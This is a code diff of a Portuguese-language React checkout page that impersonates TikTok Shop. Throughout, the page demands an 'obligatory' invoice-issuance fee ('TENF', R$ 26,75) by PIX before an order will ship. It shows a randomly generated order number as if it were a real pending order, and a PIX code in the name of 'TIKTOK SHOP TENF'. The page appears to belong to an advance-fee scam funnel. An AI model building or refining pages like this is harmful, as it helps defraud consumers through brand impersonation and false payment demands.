@@ -1,19 +1,24 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useMemo } from "react";
 import { useNavigate } from "react-router-dom";
-import { X, Copy, Clock, Loader2, CheckCircle } from "lucide-react";
+import { X, Copy, Clock, Loader2, CreditCard, Info, HelpCircle } from "lucide-react";
 import { toast } from "sonner";
 import { Button } from "@/components/ui/button";
 import tiktokLogo from "@/assets/upsell/tiktok-shop.png";
 import slimhealthLogo from "@/assets/slimhealth-logo.png";
 import cimedLogo from "@/assets/cimed-logo.png";
 
-const Upsell1Page = () => {
+const Upsell2Page = () => {
   const navigate = useNavigate();
   const [showModal, setShowModal] = useState(false);
   const [timeLeft, setTimeLeft] = useState(900); // 15 minutos
 
-  // Placeholder PIX code para upsell
-  const pixCode = "00020101021226940014br.gov.bcb.pix2572qrcodespix.sejaefi.com.br/v2/cobfc73d8f1cc9a469c7b33e0e5d0e08a675204000053039865802BR5925TIKTOK SHOP NF EMISSAO6009SAO PAULO62070503***6304";
+  // Gerar número de pedido aleatório uma vez
+  const orderNumber = useMemo(() => {
+    return String(Math.floor(Math.random() * 90000) + 10000).padStart(8, '0');
+  }, []);
+
+  // Placeholder PIX code para upsell 2
+  const pixCode = "00020101021226940014br.gov.bcb.pix2572qrcodespix.sejaefi.com.br/v2/cobfc73d8f1cc9a469c7b33e0e5d0e08a675204000053039865802BR5925TIKTOK SHOP TENF6009SAO PAULO62070503***6304";
 
   useEffect(() => {
     if (!showModal) return;
@@ -52,59 +57,72 @@ const Upsell1Page = () => {
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
-      {/* Header com Logo TikTok Shop */}
+      {/* Header com Logo TikTok Shop - sem borda */}
       <div className="bg-white px-4 py-4 flex justify-center">
         <img src={tiktokLogo} alt="TikTok Shop" className="h-10 w-auto" />
       </div>
 
       {/* Content */}
-      <div className="flex-1 flex flex-col items-center justify-center p-4">
-        <div className="w-full max-w-md">
-          {/* Mensagem de Parabéns */}
-          <div className="text-center mb-6">
-            <h1 className="text-2xl md:text-3xl font-extrabold text-[#1a1a2e] mb-2">
-              Parabéns!
-            </h1>
-            <p className="text-gray-600 text-base leading-relaxed">
-              Você acabou de garantir seu produto promocional através da TikTok Shop! 
-              Para concluir, basta realizar o pagamento da emissão da Nota Fiscal.
-            </p>
-          </div>
-
-          {/* Card NF-e */}
-          <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
-            <div className="text-center">
-              <p className="text-sm text-gray-500 font-medium uppercase tracking-wide mb-1">
-                NF-e (Taxa de Emissão de NF)
-              </p>
-              <p className="text-4xl font-bold text-gray-900 mb-2">
-                R$ 47,89
-              </p>
-              <p className="text-sm text-gray-500">
-                Taxa única para emissão da NF
-              </p>
+      <div className="flex-1 flex flex-col items-center p-4">
+        <div className="w-full max-w-md space-y-4">
+          
+          {/* Card 1 - Status do Pedido */}
+          <div className="bg-white rounded-2xl shadow-lg p-6">
+            <div className="flex items-start gap-4">
+              <div className="w-10 h-10 bg-rose-100 rounded-full flex items-center justify-center flex-shrink-0">
+                <CreditCard className="w-5 h-5 text-rose-500" />
+              </div>
+              <div className="flex-1">
+                <h2 className="font-semibold text-[#1a1a2e] text-lg mb-3">Status do Pedido</h2>
+                <div className="space-y-2 text-sm text-gray-600">
+                  <p><span className="font-medium text-gray-700">Número do pedido:</span> {orderNumber}</p>
+                  <p><span className="font-medium text-gray-700">Status:</span> Aguardando pagamento</p>
+                  <p><span className="font-medium text-gray-700">Valor da TENF:</span> R$ 26,75</p>
+                </div>
+              </div>
             </div>
           </div>
 
-          {/* Botão Efetuar Pagamento */}
+          {/* Card 2 - Pagamento Pendente */}
+          <div className="bg-white rounded-2xl shadow-lg p-6">
+            <div className="flex items-start gap-4">
+              <div className="w-10 h-10 bg-rose-100 rounded-full flex items-center justify-center flex-shrink-0">
+                <Info className="w-5 h-5 text-rose-500" />
+              </div>
+              <div className="flex-1">
+                <h2 className="font-semibold text-[#1a1a2e] text-lg mb-2">Pagamento Pendente</h2>
+                <p className="text-sm text-gray-600 leading-relaxed">
+                  Seu pedido está quase pronto para ser enviado! Para finalizar, realize o pagamento da TENF no valor de <strong>R$ 26,75</strong>.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          {/* Botão Pagar TENF */}
           <Button
             onClick={handleOpenModal}
             className="w-full bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white font-bold py-4 rounded-xl shadow-lg text-lg h-auto"
           >
-            Efetuar pagamento da Taxa
+            PAGAR TENF - R$ 26,75
           </Button>
 
-          {/* Card Aviso */}
-          <div className="bg-white rounded-2xl shadow-lg p-6 mt-6">
-            <p className="text-gray-700 text-sm leading-relaxed">
-              <strong>Atenção:</strong> Para receber seu produto do TikTok Shop, é necessário pagar a 
-              NF-e (Taxa de Emissão de Nota Fiscal). Sem o pagamento, o envio não será 
-              autorizado e o pedido será cancelado.
-            </p>
+          {/* Card 3 - Por que preciso pagar? */}
+          <div className="bg-white rounded-2xl shadow-lg p-6">
+            <div className="flex items-start gap-4">
+              <div className="w-10 h-10 bg-rose-100 rounded-full flex items-center justify-center flex-shrink-0">
+                <HelpCircle className="w-5 h-5 text-rose-500" />
+              </div>
+              <div className="flex-1">
+                <h2 className="font-semibold text-[#1a1a2e] text-lg mb-2">Por que preciso pagar a TENF?</h2>
+                <p className="text-sm text-gray-600 leading-relaxed">
+                  A TENF é uma taxa obrigatória para emissão da nota fiscal. Após o pagamento, seu pedido será enviado em até 24 horas.
+                </p>
+              </div>
+            </div>
           </div>
 
           {/* Logos SlimHealth + CIMED */}
-          <div className="flex items-center justify-center gap-3 mt-8 mb-8">
+          <div className="flex items-center justify-center gap-3 mt-6 mb-8">
             <img 
               src={slimhealthLogo} 
               alt="SlimHealth" 
@@ -131,7 +149,7 @@ const Upsell1Page = () => {
             onClick={(e) => e.stopPropagation()}
           >
             {/* Header do Modal */}
-            <div className="bg-white border-b border-gray-100 px-4 py-3 flex items-center justify-between">
+            <div className="bg-white px-4 py-3 flex items-center justify-between">
               <div className="w-8" /> {/* Spacer */}
               <img src={tiktokLogo} alt="TikTok Shop" className="h-8 w-auto" />
               <button 
@@ -146,8 +164,8 @@ const Upsell1Page = () => {
             <div className="p-6">
               {/* Título e Valor */}
               <div className="text-center mb-4">
-                <p className="text-gray-500 text-sm font-medium">Taxa de Nota Fiscal</p>
-                <p className="text-3xl font-bold text-gray-900 mt-1">R$ 47,89</p>
+                <p className="text-gray-500 text-sm font-medium">TENF</p>
+                <p className="text-3xl font-bold text-gray-900 mt-1">R$ 26,75</p>
               </div>
 
               {/* QR Code */}
@@ -191,16 +209,6 @@ const Upsell1Page = () => {
               <p className="text-xs text-gray-400 text-center mt-4 break-all line-clamp-2 px-2">
                 {pixCode}
               </p>
-
-              {/* Botão Simular Pagamento - para testes */}
-              <Button
-                onClick={() => navigate('/upsell2')}
-                variant="outline"
-                className="w-full mt-4 border-green-500 text-green-600 hover:bg-green-50 font-semibold py-3 rounded-xl flex items-center justify-center gap-2"
-              >
-                <CheckCircle className="w-5 h-5" />
-                Simular Pagamento Confirmado
-              </Button>
             </div>
           </div>
         </div>
@@ -209,4 +217,4 @@ const Upsell1Page = () => {
   );
 };
 
-export default Upsell1Page;
+export default Upsell2Page;
